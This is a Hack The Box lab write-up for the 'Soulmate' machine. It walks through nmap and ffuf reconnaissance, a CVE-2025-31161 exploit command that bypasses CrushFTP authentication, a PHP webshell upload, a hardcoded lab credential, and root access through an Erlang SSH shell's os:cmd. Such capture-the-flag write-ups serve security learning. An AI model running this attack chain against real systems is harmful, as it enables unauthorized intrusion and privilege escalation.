---
title: Soulmate
date: 2025-10-30
description: Easy Linux machine exploiting CVE-2025-31161 for a CrushFTP authentication bypass, uploading a PHP webshell for initial access, recovering credentials from a root-owned script, and escalating privileges through an internal Erlang/OTP shell on port 2222 to gain root.
tags:
  - htb
  - Easy
  - Linux
---

# Initial Recon

`nmap` exposed SSH, HTTP, and an Erlang Port Mapper Daemon:

```bash 
# Nmap 7.95 scan initiated Thu Oct 30 14:27:13 2025 as: /usr/lib/nmap/nmap -p22,80,4369 -A -oN scan_results.txt 10.10.11.86
Nmap scan report for soulmate.htb (10.10.11.86)
Host is up (0.39s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
80/tcp   open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-title: Soulmate - Find Your Perfect Match
4369/tcp open  epmd    Erlang Port Mapper Daemon
| epmd-info: 
|   epmd_port: 4369
|   nodes: 
|_    ssh_runner: 44543
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|router
Running: Linux 4.X|5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 4.15 - 5.19, Linux 5.0 - 5.14, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 443/tcp)
HOP RTT       ADDRESS
1   383.41 ms 10.10.14.1
2   383.49 ms soulmate.htb (10.10.11.86)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Oct 30 14:27:40 2025 -- 1 IP address (1 host up) scanned in 26.97 seconds
```
The web application on port `80` was a dating site titled **Soulmate - Find Your Perfect Match**. I tested the textarea for XSS, but it wasn't vulnerable.

Subdomain enumeration with `ffuf` surfaced `ftp.soulmate.htb`:

```bash
ffuf -c -u "http://soulmate.htb" -H "HOST:FUZZ.soulmate.htb" -w /usr/share/seclists/Discovery/DNS/n0kovo_subdomains.txt -fw 4
```

Source code review revealed the frontend was running **CrushFTP 11**.

# User

## CrushFTP Auth Bypass

Research identified **CVE-2025-31161**, an authentication bypass allowing arbitrary admin user creation:

```bash
python3 cve-2025-31161.py --target_host ftp.soulmate.htb --port 80 --target_user root --new_user dante --password dante
```

Logged in as the newly created `dante` account and navigated to **Admin → User Manager → ben**, where I generated a random password for `ben`, saved it, and re-authenticated as `ben`.

`ben` held the `webProd` directory — the web root backing `soulmate.htb`, containing all the site's PHP files.

## Webshell Upload

Uploaded a PHP webshell through **Add Files**, which landed directly in the web root:

```text
http://soulmate.htb/shell.php
```

Triggered a reverse shell callback and captured a foothold as `www-data`.

## Credential Recovery

Process monitoring with `pspy64` revealed root periodically executing a login script. Reviewing the script exposed hardcoded credentials:

```text
ben : HouseH0ldings998
```

Logged in over SSH as `ben`:

```bash
ssh ben@<target>
```

# Root

The same script also spawned a service on port `2222`. A quick netcat connection returned an information disclosure banner, though commands failed due to protocol mismatch.

Research via HackTricks pointed to **Erlang Port Mapper Daemon (epmd)** on `4369` and an Erlang SSH interface on `2222`.

Connected to the internal Erlang shell:

```bash
ssh ben@localhost -p 2222
```

This granted an **Eshell** — the Erlang interactive shell — authenticated as `ssh_runner`, from which modules could be loaded and system commands executed directly:

```erlang
m().
os:cmd("id").
```

The `os:cmd` call ran with root privileges, so the flag was ours along with a stable root shell.

Gained `root`
